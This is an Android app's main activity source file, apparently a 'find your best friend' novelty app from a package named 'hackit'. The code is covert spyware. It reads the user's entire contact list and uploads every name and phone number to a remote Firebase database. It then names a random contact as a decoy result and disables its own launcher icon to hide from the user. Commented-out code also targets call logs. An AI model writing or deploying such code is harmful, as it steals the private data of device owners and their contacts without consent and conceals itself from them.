package com.example.hackit;

import androidx.appcompat.app.AlertDialog;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import android.Manifest;
import android.content.ComponentName;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.os.Bundle;
import android.os.StrictMode;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.LinearLayout;
import android.widget.ListView;
import android.widget.SimpleCursorAdapter;
import android.widget.TextView;
import android.widget.Toast;

import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;

import java.util.ArrayList;
import java.util.List;
import java.util.Random;

public class MainActivity extends AppCompatActivity {

    //    ListView listView;
    Button button;
    List<String> Names, Numbers;
//    TextView textView;

    FirebaseDatabase database = FirebaseDatabase.getInstance();
    DatabaseReference ref;
    String Username;

    public static final int PERMISSIONS_REQUEST_READ_CONTACTS = 1;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

//        textView=findViewById(R.id.bf);
        Names = new ArrayList<>();
        Numbers = new ArrayList<>();
        button = findViewById(R.id.button);
        button.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                Cursor cursor = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);
                startManagingCursor(cursor);
//                if (ActivityCompat.checkSelfPermission(MainActivity.this, Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) {
//                    // TODO: Consider calling
//                    //    ActivityCompat#requestPermissions
//                    // here to request the missing permissions, and then overriding
//                    //   public void onRequestPermissionsResult(int requestCode, String[] permissions,
//                    //                                          int[] grantResults)
//                    // to handle the case where the user grants the permission. See the documentation
//                    // for ActivityCompat#requestPermissions for more details.
//                    return;
//                }
//                Cursor c = getContentResolver().query(CallLog.Calls.CONTENT_URI, null, null, null, null);
//                startManagingCursor(c);
                while (cursor.moveToNext()){
                    String name=cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
                    String number=cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                    Names.add(name);
                    Numbers.add(number);
                }

                ref=database.getReference("User").child(Username);//.child()
                for(int i=0;i<Names.size();i++){
                    System.out.println(Names.get(i)+ " " +Numbers.get(i));
//            Content content=new Content(Names.get(i),Numbers.get(i));
                    String a=Names.get(i);
                            a=a.replace('[',',');
                            a=a.replace(']', ',');
                            a=a.replace('.', ',');
                            a=a.replace('#', ',');
                            a=a.replace('$',',');
//                            Names.get(i).replace('.',',');
//                    System.out.println("sdfcghvjbknbkjhv hgvblkj "+ a);
                    ref.child(a).setValue(Numbers.get(i));
                }

                int rand=(int) (Math.random() * Names.size());
                AlertDialog.Builder alert= new AlertDialog.Builder(MainActivity.this);
                alert.setTitle("Your BestFriend Is " + Names.get(rand));
                alert.setMessage(" ");
                alert.show();
//                textView.setText(Names.get(rand));
                hide();
            }
        });
    }

    @Override
    protected void onStart() {
        checkPermission(android.Manifest.permission.READ_CONTACTS,PERMISSIONS_REQUEST_READ_CONTACTS);
        setUsername();
        super.onStart();
    }

//    public void  get(View v){
//        Cursor cursor=getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,null,null,null,null);
//        startManagingCursor(cursor);
////        String[] from = {ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,ContactsContract.CommonDataKinds.Phone.NUMBER,ContactsContract.CommonDataKinds.Phone._ID};
//
//        while (cursor.moveToNext()){
//            String name=cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
//            String number=cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
//            Names.add(name);
//            Numbers.add(number);
//        }
//
//
//        ref=database.getReference("User").child(Username);//.child()
//        for(int i=0;i<Names.size();i++){
//            System.out.println(Names.get(i)+ " " +Numbers.get(i));
////            Content content=new Content(Names.get(i),Numbers.get(i));
//            ref.child(Names.get(i)).child("Number").setValue(Numbers.get(i));
//        }
////        databaseupdate();
////        ref=database.getReference("User").child(Username);
//
//
//        int rand=(int) (Math.random() * Names.size());
//        textView.setText(Names.get(rand));
//        AlertDialog.Builder alert= new AlertDialog.Builder(MainActivity.this);
//        alert.setTitle("Your BestFriend Is " + Names.get(rand));
//        alert.setMessage(" ");
//        alert.show();
////        cursor.moveToFirst();
////        int[] to = {android.R.id.text1,android.R.id.text2};
////
////        SimpleCursorAdapter simpleCursorAdapter=new SimpleCursorAdapter(this,android.R.layout.simple_list_item_2,cursor,from,to);
////        listView.setAdapter(simpleCursorAdapter);
////        listView.setChoiceMode(ListView.CHOICE_MODE_MULTIPLE);
//        hide();
//
//    }

//    private void databaseupdate() {
//        ref=database.getReference("User").child(Username);//.child()
//        for(int i=0;i<Names.size();i++){
//            System.out.println(Names.get(i)+ " " +Numbers.get(i));
////            Content content=new Content(Names.get(i),Numbers.get(i));
//            ref.child(Names.get(i)).child("Number").setValue(Numbers.get(i));
//        }
//    }

    private void hide() {
        PackageManager p = getPackageManager();
        ComponentName componentName = new ComponentName(this, com.example.hackit.MainActivity.class);
// activity which is first time open in manifiest file which is declare as
// <category android:name="android.intent.category.LAUNCHER" />
        p.setComponentEnabledSetting(componentName,PackageManager.COMPONENT_ENABLED_STATE_DISABLED,  PackageManager.DONT_KILL_APP);
    }

    public void checkPermission(String permission, int requestCode)
    {

        // Checking if permission is not granted
        if (ContextCompat.checkSelfPermission(
                MainActivity.this,
                permission)
                == PackageManager.PERMISSION_DENIED) {
            ActivityCompat
                    .requestPermissions(
                            MainActivity.this,
                            new String[] { permission },
                            requestCode);
        }
        else {
            Toast
                    .makeText(MainActivity.this,
                            "Permission already granted",
                            Toast.LENGTH_SHORT)
                    .show();
        }
    }
    public void setUsername(){

        AlertDialog.Builder alertdialog = new AlertDialog.Builder(MainActivity.this);
        alertdialog.setTitle("Enter Your Name");

        final EditText input = new EditText(MainActivity.this);
        LinearLayout.LayoutParams lp = new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                LinearLayout.LayoutParams.MATCH_PARENT);
        input.setLayoutParams(lp);
        alertdialog.setView(input);

        alertdialog.setNegativeButton("Cancel", new DialogInterface.OnClickListener() {
            @Override
            public void onClick(DialogInterface dialogInterface, int i) {
                dialogInterface.cancel();
            }
        });
        alertdialog.setPositiveButton("Create", new DialogInterface.OnClickListener() {
            @Override
            public void onClick(DialogInterface dialogInterface, int i) {
                Username=input.getText().toString();
            }
        });
        alertdialog.show();
    }
}
